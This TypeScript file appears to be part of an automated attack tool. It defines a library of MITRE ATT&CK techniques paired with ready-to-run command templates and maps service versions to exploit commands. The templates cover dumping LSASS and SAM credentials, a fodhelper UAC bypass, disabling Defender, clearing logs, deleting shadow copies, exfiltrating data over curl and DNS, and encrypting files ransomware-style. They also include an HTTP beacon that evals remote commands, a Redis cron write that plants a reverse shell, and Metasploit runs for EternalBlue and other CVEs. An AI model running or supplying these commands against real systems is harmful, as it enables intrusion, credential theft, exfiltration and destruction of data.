import { AttackPhase } from './AttackGraph.js';

export interface TechniqueDef {
    id: string;
    name: string;
    phase: AttackPhase;
    os: ('windows' | 'linux' | 'darwin' | 'all')[];
    preconditions: string[];
    commandTemplate: string;
    description: string;
    mitreId: string;
    tags?: string[];
}

export interface ServiceExploit {
    service: string;
    versionPattern: RegExp;
    technique: string;
    cve?: string;
    command: string;
}

export class TechniqueLibrary {
    private techniques: TechniqueDef[] = [];
    private serviceExploits: ServiceExploit[] = [];

    constructor() {
        this.initLibrary();
        this.initServiceExploits();
    }

    private initLibrary(): void {
        this.techniques = [
            // ── RECON ──
            { id: 'T1046', name: 'Network Service Scanning', phase: 'recon', os: ['all'], preconditions: ['network_access'], commandTemplate: 'nmap -sV -sC -O -Pn {target}', description: 'Port scan with service version detection and OS fingerprinting.', mitreId: 'T1046', tags: ['nmap', 'scan'] },
            { id: 'T1018', name: 'Remote System Discovery', phase: 'recon', os: ['all'], preconditions: ['network_access'], commandTemplate: 'nmap -sn {subnet}', description: 'Ping sweep to discover live hosts on the network.', mitreId: 'T1018', tags: ['discovery', 'sweep'] },
            { id: 'T1016', name: 'System Network Config Discovery', phase: 'discovery', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'ipconfig /all & route print & arp -a', description: 'Enumerates network configuration, routes, and ARP cache.', mitreId: 'T1016', tags: ['network'] },
            { id: 'T1016.L', name: 'System Network Config Discovery Linux', phase: 'discovery', os: ['linux'], preconditions: ['user_access'], commandTemplate: 'ip addr; ip route; arp -a; cat /etc/resolv.conf', description: 'Enumerates Linux network configuration.', mitreId: 'T1016', tags: ['network'] },
            { id: 'T1087.001', name: 'Local Account Discovery', phase: 'discovery', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'net user', description: 'Enumerates local user accounts.', mitreId: 'T1087.001', tags: ['users'] },
            { id: 'T1087.002', name: 'Domain Account Discovery', phase: 'discovery', os: ['windows'], preconditions: ['domain_user'], commandTemplate: 'net user /domain', description: 'Enumerates domain user accounts.', mitreId: 'T1087.002', tags: ['users', 'ad'] },

            // ── EXECUTION ──
            { id: 'T1059.001', name: 'PowerShell Execution', phase: 'execution', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'powershell -nop -ep bypass -c "{command}"', description: 'Executes commands using PowerShell with execution policy bypass.', mitreId: 'T1059.001', tags: ['powershell'] },
            { id: 'T1059.003', name: 'Windows Command Shell', phase: 'execution', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'cmd.exe /c {command}', description: 'Executes commands via cmd.exe.', mitreId: 'T1059.003', tags: ['cmd'] },
            { id: 'T1059.004', name: 'Unix Shell Execution', phase: 'execution', os: ['linux', 'darwin'], preconditions: ['user_access'], commandTemplate: 'sh -c "{command}"', description: 'Executes commands via Unix shell.', mitreId: 'T1059.004', tags: ['shell'] },
            { id: 'T1059.006', name: 'Python Execution', phase: 'execution', os: ['all'], preconditions: ['python_installed'], commandTemplate: 'python3 -c "{command}"', description: 'Executes Python code.', mitreId: 'T1059.006', tags: ['python'] },
            { id: 'T1059.007', name: 'JavaScript Execution', phase: 'execution', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'cscript //nologo {script}.js', description: 'Executes JScript via Windows Script Host.', mitreId: 'T1059.007', tags: ['jscript'] },
            { id: 'T1047', name: 'WMI Execution', phase: 'execution', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'wmic process call create "{command}"', description: 'Executes commands via Windows Management Instrumentation.', mitreId: 'T1047', tags: ['wmi'] },
            { id: 'T1053.002', name: 'AT Job', phase: 'execution', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'at {time} /interactive "{command}"', description: 'Schedules command execution via AT.', mitreId: 'T1053.002', tags: ['at'] },

            // ── PERSISTENCE ──
            { id: 'T1547.001', name: 'Registry Run Keys', phase: 'persistence', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} /t REG_SZ /d "{path}" /f', description: 'Establishes persistence via HKCU Run key.', mitreId: 'T1547.001', tags: ['registry'] },
            { id: 'T1547.001.M', name: 'Registry Run Keys (Machine)', phase: 'persistence', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'reg add HKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v {name} /t REG_SZ /d "{path}" /f', description: 'Machine-wide Run key persistence.', mitreId: 'T1547.001', tags: ['registry', 'admin'] },
            { id: 'T1053.005', name: 'Scheduled Task', phase: 'persistence', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'schtasks /create /tn "{name}" /sc ONLOGON /tr "{path}" /f', description: 'Scheduled task triggered at logon.', mitreId: 'T1053.005', tags: ['schtasks'] },
            { id: 'T1053.003', name: 'Cron Job', phase: 'persistence', os: ['linux'], preconditions: ['user_access'], commandTemplate: '(crontab -l 2>/dev/null; echo "* * * * * {command}") | crontab -', description: 'Adds a recurring user cron job.', mitreId: 'T1053.003', tags: ['cron'] },
            { id: 'T1543.003', name: 'Windows Service', phase: 'persistence', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'sc create {name} binPath= "{path}" start= auto', description: 'Creates a Windows service for persistence.', mitreId: 'T1543.003', tags: ['service'] },
            { id: 'T1543.002', name: 'Systemd Service', phase: 'persistence', os: ['linux'], preconditions: ['root_access'], commandTemplate: 'echo "[Unit]\\nDescription={name}\\n[Service]\\nExecStart={path}\\nRestart=always\\n[Install]\\nWantedBy=multi-user.target" > /etc/systemd/system/{name}.service && systemctl enable {name}', description: 'Systemd service persistence.', mitreId: 'T1543.002', tags: ['systemd'] },
            { id: 'T1546.003', name: 'WMI Event Subscription', phase: 'persistence', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'powershell -c "Register-WmiEvent -Query \\"SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA \'Win32_PerfFormattedData_PerfOS_System\'\\" -Action {[Diagnostics.Process]::Start(\'{path}\')}"', description: 'WMI event-driven persistence.', mitreId: 'T1546.003', tags: ['wmi'] },
            { id: 'T1546.015', name: 'COM Hijack', phase: 'persistence', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'reg add HKCU\\Software\\Classes\\CLSID\\{clsid}\\InprocServer32 /ve /d "{dllPath}" /f', description: 'COM object hijack for persistence.', mitreId: 'T1546.015', tags: ['com'] },
            { id: 'T1547.006', name: 'Kernel Module / .ko', phase: 'persistence', os: ['linux'], preconditions: ['root_access'], commandTemplate: 'insmod {module_path}', description: 'Loads a kernel module for rootkit-level persistence.', mitreId: 'T1547.006', tags: ['kernel'] },

            // ── PRIVILEGE ESCALATION ──
            { id: 'T1068', name: 'Exploitation for Privilege Escalation', phase: 'privilege_escalation', os: ['all'], preconditions: ['user_access'], commandTemplate: '{exploit_binary}', description: 'Exploits a software vulnerability to gain elevated privileges.', mitreId: 'T1068', tags: ['exploit'] },
            { id: 'T1548.002', name: 'UAC Bypass', phase: 'privilege_escalation', os: ['windows'], preconditions: ['admin_group_member'], commandTemplate: 'powershell -c "New-Item \'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\' -Force; Set-ItemProperty \'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\' -Name \'DelegateExecute\' -Value \'\' -Force; Set-ItemProperty \'HKCU:\\Software\\Classes\\ms-settings\\Shell\\Open\\command\' -Name \'(Default)\' -Value \'{path}\' -Force; Start-Process fodhelper.exe"', description: 'Bypasses UAC via fodhelper.exe COM auto-elevation.', mitreId: 'T1548.002', tags: ['uac'] },
            { id: 'T1134.001', name: 'Token Impersonation (Potato)', phase: 'privilege_escalation', os: ['windows'], preconditions: ['SeImpersonatePrivilege'], commandTemplate: 'JuicyPotato.exe -l 1337 -p {command} -t * -c {clsid}', description: 'Potato-family token impersonation to SYSTEM.', mitreId: 'T1134.001', tags: ['potato', 'impersonation'] },
            { id: 'T1548.001', name: 'Setuid/Setgid Abuse', phase: 'privilege_escalation', os: ['linux'], preconditions: ['user_access'], commandTemplate: 'find / -perm -4000 -type f 2>/dev/null', description: 'Discovers and exploits SUID/SGID binaries.', mitreId: 'T1548.001', tags: ['suid'] },
            { id: 'T1055', name: 'DLL Injection', phase: 'privilege_escalation', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'inject.exe -p {pid} -d {dll_path}', description: 'Injects DLL into a higher-privilege process.', mitreId: 'T1055', tags: ['injection'] },

            // ── DEFENSE EVASION ──
            { id: 'T1562.001', name: 'Disable Security Tools', phase: 'defense_evasion', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'powershell -c "Set-MpPreference -DisableRealtimeMonitoring $true"', description: 'Disables Windows Defender real-time monitoring.', mitreId: 'T1562.001', tags: ['defender', 'av'] },
            { id: 'T1070.001', name: 'Clear Windows Event Logs', phase: 'defense_evasion', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'wevtutil cl Security & wevtutil cl System & wevtutil cl Application', description: 'Clears Windows event logs to remove evidence.', mitreId: 'T1070.001', tags: ['logs'] },
            { id: 'T1070.003', name: 'Clear Bash History', phase: 'defense_evasion', os: ['linux'], preconditions: ['user_access'], commandTemplate: 'history -c; cat /dev/null > ~/.bash_history; unset HISTFILE', description: 'Clears bash command history.', mitreId: 'T1070.003', tags: ['logs', 'history'] },
            { id: 'T1027', name: 'Obfuscated Files/Payloads', phase: 'defense_evasion', os: ['all'], preconditions: ['user_access'], commandTemplate: 'base64 -w 0 {payload} > {output}.b64', description: 'Base64 encodes payloads for evasion.', mitreId: 'T1027', tags: ['obfuscation'] },
            { id: 'T1218.010', name: 'Regsvr32 Proxy Execution', phase: 'defense_evasion', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'regsvr32 /s /n /u /i:{url} scrobj.dll', description: 'Proxy execution via regsvr32 to bypass application whitelisting.', mitreId: 'T1218.010', tags: ['lolbas', 'regsvr32'] },
            { id: 'T1218.011', name: 'Rundll32 Proxy Execution', phase: 'defense_evasion', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication";document.write();h=new%20ActiveXObject("WScript.Shell").Run("{command}")', description: 'Proxy execution via rundll32.', mitreId: 'T1218.011', tags: ['lolbas', 'rundll32'] },
            { id: 'T1140', name: 'Deobfuscate/Decode', phase: 'defense_evasion', os: ['all'], preconditions: ['user_access'], commandTemplate: 'certutil -decode {encoded} {output}', description: 'Uses certutil to decode base64 payloads on Windows.', mitreId: 'T1140', tags: ['certutil'] },
            { id: 'T1036.005', name: 'Masquerading: Match Legitimate Name', phase: 'defense_evasion', os: ['all'], preconditions: ['user_access'], commandTemplate: 'cp {payload} svchost.exe', description: 'Renames payload to match legitimate system binary name.', mitreId: 'T1036.005', tags: ['masquerade'] },

            // ── CREDENTIAL ACCESS ──
            { id: 'T1003.001', name: 'LSASS Memory Dump', phase: 'credential_access', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'procdump.exe -ma lsass.exe lsass.dmp', description: 'Dumps LSASS process memory to extract credentials.', mitreId: 'T1003.001', tags: ['lsass', 'mimikatz'] },
            { id: 'T1003.001.C', name: 'LSASS via comsvcs.dll', phase: 'credential_access', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump {lsass_pid} lsass.dmp full', description: 'LSASS dump via comsvcs MiniDump — no Sysinternals needed.', mitreId: 'T1003.001', tags: ['lsass', 'comsvcs'] },
            { id: 'T1003.002', name: 'SAM Database Dump', phase: 'credential_access', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'reg save HKLM\\SAM sam.hive & reg save HKLM\\SYSTEM system.hive', description: 'Exports SAM and SYSTEM hives for offline cracking.', mitreId: 'T1003.002', tags: ['sam'] },
            { id: 'T1003.003', name: 'NTDS.dit Extraction', phase: 'credential_access', os: ['windows'], preconditions: ['domain_admin'], commandTemplate: 'ntdsutil "ac i ntds" "ifm" "create full {output_dir}" q q', description: 'Extracts NTDS.dit from domain controller.', mitreId: 'T1003.003', tags: ['ntds', 'dcsync'] },
            { id: 'T1003.006', name: 'DCSync', phase: 'credential_access', os: ['windows'], preconditions: ['replication_rights'], commandTemplate: 'impacket-secretsdump {domain}/{user}:{pass}@{dc_ip}', description: 'DCSync attack to replicate AD password data.', mitreId: 'T1003.006', tags: ['dcsync', 'impacket'] },
            { id: 'T1558.003', name: 'Kerberoasting', phase: 'credential_access', os: ['windows'], preconditions: ['domain_user'], commandTemplate: 'impacket-GetUserSPNs {domain}/{user}:{pass} -request -outputfile kerberoast.txt', description: 'Requests TGS tickets for SPN accounts to crack offline.', mitreId: 'T1558.003', tags: ['kerberos'] },
            { id: 'T1558.004', name: 'AS-REP Roasting', phase: 'credential_access', os: ['windows'], preconditions: ['network_access'], commandTemplate: 'impacket-GetNPUsers {domain}/ -usersfile users.txt -format hashcat -outputfile asrep.txt', description: 'Extracts AS-REP hashes for accounts without pre-authentication.', mitreId: 'T1558.004', tags: ['kerberos', 'asrep'] },
            { id: 'T1552.001', name: 'Credentials in Files', phase: 'credential_access', os: ['all'], preconditions: ['user_access'], commandTemplate: 'findstr /si password *.txt *.xml *.ini *.cfg *.config', description: 'Searches for plaintext credentials in files.', mitreId: 'T1552.001', tags: ['files', 'grep'] },
            { id: 'T1552.004', name: 'Private Keys', phase: 'credential_access', os: ['all'], preconditions: ['user_access'], commandTemplate: 'find / -name "*.pem" -o -name "*.key" -o -name "*.pfx" -o -name "*.p12" -o -name "id_rsa" 2>/dev/null', description: 'Discovers private key files on disk.', mitreId: 'T1552.004', tags: ['keys', 'ssh'] },

            // ── LATERAL MOVEMENT ──
            { id: 'T1021.001', name: 'Remote Desktop Protocol', phase: 'lateral_movement', os: ['windows'], preconditions: ['valid_credentials'], commandTemplate: 'xfreerdp /v:{target} /u:{user} /p:{pass} /cert:ignore', description: 'RDP lateral movement.', mitreId: 'T1021.001', tags: ['rdp'] },
            { id: 'T1021.002', name: 'SMB/Admin Shares (PsExec)', phase: 'lateral_movement', os: ['windows'], preconditions: ['admin_credentials'], commandTemplate: 'impacket-psexec {domain}/{user}:{pass}@{target}', description: 'Remote exec via SMB admin shares.', mitreId: 'T1021.002', tags: ['smb', 'psexec'] },
            { id: 'T1021.003', name: 'DCOM Execution', phase: 'lateral_movement', os: ['windows'], preconditions: ['admin_credentials'], commandTemplate: 'impacket-dcomexec {domain}/{user}:{pass}@{target} "{command}"', description: 'Remote exec via Distributed COM.', mitreId: 'T1021.003', tags: ['dcom'] },
            { id: 'T1021.004', name: 'SSH Lateral Movement', phase: 'lateral_movement', os: ['linux'], preconditions: ['valid_credentials'], commandTemplate: 'ssh {user}@{target}', description: 'SSH to lateral target.', mitreId: 'T1021.004', tags: ['ssh'] },
            { id: 'T1021.006', name: 'WinRM Execution', phase: 'lateral_movement', os: ['windows'], preconditions: ['admin_credentials'], commandTemplate: 'evil-winrm -i {target} -u {user} -p {pass}', description: 'Remote shell via WinRM.', mitreId: 'T1021.006', tags: ['winrm'] },
            { id: 'T1021.002.W', name: 'WMI Remote Execution', phase: 'lateral_movement', os: ['windows'], preconditions: ['admin_credentials'], commandTemplate: 'impacket-wmiexec {domain}/{user}:{pass}@{target}', description: 'Remote exec via WMI.', mitreId: 'T1021.002', tags: ['wmi'] },
            { id: 'T1550.002', name: 'Pass the Hash', phase: 'lateral_movement', os: ['windows'], preconditions: ['ntlm_hash'], commandTemplate: 'impacket-psexec -hashes :{hash} {domain}/{user}@{target}', description: 'Authenticates using NTLM hash instead of password.', mitreId: 'T1550.002', tags: ['pth'] },
            { id: 'T1550.003', name: 'Pass the Ticket', phase: 'lateral_movement', os: ['windows'], preconditions: ['kerberos_ticket'], commandTemplate: 'export KRB5CCNAME={ticket_path}; impacket-psexec -k -no-pass {domain}/{user}@{target}', description: 'Authenticates using a Kerberos ticket.', mitreId: 'T1550.003', tags: ['ptt', 'kerberos'] },

            // ── COLLECTION ──
            { id: 'T1560.001', name: 'Archive via Utility', phase: 'collection', os: ['all'], preconditions: ['user_access'], commandTemplate: 'tar czf /tmp/loot.tar.gz {target_dir}', description: 'Archives collected data for exfiltration.', mitreId: 'T1560.001', tags: ['archive'] },
            { id: 'T1005', name: 'Data from Local System', phase: 'collection', os: ['all'], preconditions: ['user_access'], commandTemplate: 'find {path} -name "*.docx" -o -name "*.xlsx" -o -name "*.pdf" -o -name "*.kdbx" 2>/dev/null', description: 'Discovers high-value files on local system.', mitreId: 'T1005', tags: ['files'] },
            { id: 'T1113', name: 'Screen Capture', phase: 'collection', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'powershell -c "Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Screen]::PrimaryScreen | ForEach-Object { $b = New-Object Drawing.Bitmap($_.Bounds.Width, $_.Bounds.Height); $g = [Drawing.Graphics]::FromImage($b); $g.CopyFromScreen($_.Bounds.Location, [Drawing.Point]::Empty, $_.Bounds.Size); $b.Save(\'screenshot.png\') }"', description: 'Captures screenshot via PowerShell.', mitreId: 'T1113', tags: ['screenshot'] },
            { id: 'T1056.001', name: 'Keylogger', phase: 'collection', os: ['windows'], preconditions: ['user_access'], commandTemplate: 'powershell -c "# GetAsyncKeyState keylogger — use full implementation"', description: 'Captures keystrokes using GetAsyncKeyState.', mitreId: 'T1056.001', tags: ['keylogger'] },

            // ── EXFILTRATION ──
            { id: 'T1041', name: 'Exfil Over C2 Channel', phase: 'exfiltration', os: ['all'], preconditions: ['c2_established'], commandTemplate: 'curl -X POST -F "file=@{path}" {c2_url}/upload', description: 'Exfiltrates data over established HTTP C2 channel.', mitreId: 'T1041', tags: ['http'] },
            { id: 'T1048.003', name: 'Exfil Over DNS', phase: 'exfiltration', os: ['all'], preconditions: ['dns_access'], commandTemplate: 'cat {file} | base32 | fold -w 60 | while read l; do nslookup $l.{domain}; done', description: 'Exfiltrates data encoded in DNS subdomain queries.', mitreId: 'T1048.003', tags: ['dns'] },
            { id: 'T1048.002', name: 'Exfil Over HTTPS', phase: 'exfiltration', os: ['all'], preconditions: ['internet_access'], commandTemplate: 'curl -X POST -H "Content-Type: application/octet-stream" --data-binary "@{file}" {url}', description: 'Exfiltrates data over HTTPS POST.', mitreId: 'T1048.002', tags: ['https'] },
            { id: 'T1567.002', name: 'Exfil to Cloud Storage', phase: 'exfiltration', os: ['all'], preconditions: ['internet_access'], commandTemplate: 'aws s3 cp {file} s3://{bucket}/', description: 'Exfiltrates to attacker-controlled cloud storage.', mitreId: 'T1567.002', tags: ['cloud'] },

            // ── COMMAND AND CONTROL ──
            { id: 'T1071.001', name: 'HTTP C2', phase: 'command_and_control', os: ['all'], preconditions: ['internet_access'], commandTemplate: 'while true; do cmd=$(curl -s {c2_url}/tasks); eval "$cmd"; curl -s -X POST -d "$(hostname):$?" {c2_url}/results; sleep {interval}; done', description: 'Simple HTTP beacon C2 loop.', mitreId: 'T1071.001', tags: ['c2', 'http'] },
            { id: 'T1071.004', name: 'DNS C2', phase: 'command_and_control', os: ['all'], preconditions: ['dns_access'], commandTemplate: 'dnscat2 {c2_domain}', description: 'Command and control over DNS tunneling.', mitreId: 'T1071.004', tags: ['c2', 'dns'] },
            { id: 'T1572', name: 'Protocol Tunneling (SSH)', phase: 'command_and_control', os: ['linux'], preconditions: ['ssh_access'], commandTemplate: 'ssh -D 1080 -N {user}@{proxy_host}', description: 'SOCKS proxy via SSH dynamic port forwarding.', mitreId: 'T1572', tags: ['tunnel', 'socks'] },

            // ── IMPACT ──
            { id: 'T1486', name: 'Data Encrypted for Impact', phase: 'impact', os: ['all'], preconditions: ['user_access'], commandTemplate: 'openssl enc -aes-256-cbc -salt -in {file} -out {file}.enc -pass pass:{key}', description: 'Encrypts target files (ransomware simulation).', mitreId: 'T1486', tags: ['ransomware'] },
            { id: 'T1489', name: 'Service Stop', phase: 'impact', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'net stop {service_name} /y', description: 'Stops a running service to disrupt operations.', mitreId: 'T1489', tags: ['disruption'] },
            { id: 'T1490', name: 'Inhibit System Recovery', phase: 'impact', os: ['windows'], preconditions: ['admin_access'], commandTemplate: 'vssadmin delete shadows /all /quiet & bcdedit /set {default} recoveryenabled No', description: 'Deletes shadow copies and disables recovery.', mitreId: 'T1490', tags: ['recovery'] },
        ];
    }

    private initServiceExploits(): void {
        this.serviceExploits = [
            { service: 'ssh', versionPattern: /OpenSSH[_ ]([0-7]\.\d|8\.[0-7])/i, technique: 'CVE-2023-38408 / user enum', cve: 'CVE-2023-38408', command: 'ssh-audit {target}' },
            { service: 'ftp', versionPattern: /vsftpd 2\.3\.4/i, technique: 'vsftpd 2.3.4 backdoor', cve: 'CVE-2011-2523', command: 'msfconsole -x "use exploit/unix/ftp/vsftpd_234_backdoor; set RHOST {target}; run"' },
            { service: 'ftp', versionPattern: /ProFTPD 1\.3\.[0-5]/i, technique: 'ProFTPD RCE', cve: 'CVE-2015-3306', command: 'msfconsole -x "use exploit/unix/ftp/proftpd_modcopy_exec; set RHOST {target}; run"' },
            { service: 'http', versionPattern: /Apache\/2\.4\.(49|50)/i, technique: 'Apache Path Traversal', cve: 'CVE-2021-41773', command: 'curl -s --path-as-is "http://{target}/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd"' },
            { service: 'http', versionPattern: /Apache\/2\.4\.(7|8|9|1[0-9]|2[0-9]|3[0-9]|4[0-8])/i, technique: 'Apache Struts RCE (check version)', cve: 'CVE-2017-5638', command: 'python3 struts-pwn.py --url "http://{target}" -c "id"' },
            { service: 'http', versionPattern: /IIS\/([6-9]|10\.0)/i, technique: 'IIS WebDAV / ShortName scan', command: 'davtest -url http://{target}/ && java -jar IIS_shortname_scanner.jar http://{target}/' },
            { service: 'http', versionPattern: /nginx/i, technique: 'Nginx misconfiguration check', command: 'curl -s http://{target}/..;/ && nuclei -u http://{target} -t misconfiguration/nginx/' },
            { service: 'smb', versionPattern: /Samba 3\.[0-5]/i, technique: 'Samba RCE', cve: 'CVE-2017-7494', command: 'msfconsole -x "use exploit/linux/samba/is_known_pipename; set RHOST {target}; run"' },
            { service: 'smb', versionPattern: /Windows (6\.1|Server 2008)/i, technique: 'EternalBlue', cve: 'CVE-2017-0144', command: 'msfconsole -x "use exploit/windows/smb/ms17_010_eternalblue; set RHOST {target}; run"' },
            { service: 'mysql', versionPattern: /MySQL 5\.[0-5]/i, technique: 'MySQL auth bypass', cve: 'CVE-2012-2122', command: 'for i in $(seq 1 1000); do mysql -u root -p"bad" -h {target} 2>/dev/null && break; done' },
            { service: 'rdp', versionPattern: /Windows/i, technique: 'BlueKeep (check patch level)', cve: 'CVE-2019-0708', command: 'msfconsole -x "use auxiliary/scanner/rdp/cve_2019_0708_bluekeep; set RHOST {target}; run"' },
            { service: 'http', versionPattern: /Tomcat\/(7|8|9)\./i, technique: 'Tomcat Manager brute + WAR deploy', command: 'msfconsole -x "use auxiliary/scanner/http/tomcat_mgr_login; set RHOST {target}; run"' },
            { service: 'http', versionPattern: /Jenkins/i, technique: 'Jenkins Script Console RCE', command: 'curl -s http://{target}/script -d \'script=println("id".execute().text)\'' },
            { service: 'redis', versionPattern: /Redis/i, technique: 'Redis unauthenticated RCE', command: 'redis-cli -h {target} CONFIG SET dir /var/spool/cron/ && redis-cli -h {target} CONFIG SET dbfilename root && redis-cli -h {target} SET x "\\n*/1 * * * * /bin/bash -i >& /dev/tcp/{lhost}/{lport} 0>&1\\n" && redis-cli -h {target} SAVE' },
            { service: 'mongodb', versionPattern: /MongoDB/i, technique: 'MongoDB unauthenticated access', command: 'mongosh --host {target} --eval "db.adminCommand({listDatabases:1})"' },
            { service: 'elasticsearch', versionPattern: /Elasticsearch/i, technique: 'Elasticsearch unauthenticated', command: 'curl -s http://{target}:9200/_cat/indices' },
        ];
    }

    getTechniquesByPhase(phase: AttackPhase): TechniqueDef[] {
        return this.techniques.filter(t => t.phase === phase);
    }

    suggestTechnique(phase: AttackPhase, os: 'windows' | 'linux' | 'darwin'): TechniqueDef[] {
        return this.techniques.filter(t => t.phase === phase && (t.os.includes(os) || t.os.includes('all')));
    }

    getTechniqueById(id: string): TechniqueDef | undefined {
        return this.techniques.find(t => t.id === id || t.mitreId === id);
    }

    searchTechniques(query: string): TechniqueDef[] {
        const q = query.toLowerCase();
        return this.techniques.filter(t =>
            t.name.toLowerCase().includes(q) ||
            t.description.toLowerCase().includes(q) ||
            t.id.toLowerCase().includes(q) ||
            (t.tags && t.tags.some(tag => tag.includes(q)))
        );
    }

    matchExploits(serviceFingerprint: string): ServiceExploit[] {
        return this.serviceExploits.filter(se => se.versionPattern.test(serviceFingerprint));
    }

    getAllTechniques(): TechniqueDef[] {
        return [...this.techniques];
    }

    getAllServiceExploits(): ServiceExploit[] {
        return [...this.serviceExploits];
    }

    getStats(): { techniques: number; phases: number; exploitMappings: number } {
        const phases = new Set(this.techniques.map(t => t.phase));
        return {
            techniques: this.techniques.length,
            phases: phases.size,
            exploitMappings: this.serviceExploits.length
        };
    }
}

let instance: TechniqueLibrary | null = null;
export function getTechniqueLibrary(): TechniqueLibrary {
    if (!instance) instance = new TechniqueLibrary();
    return instance;
}
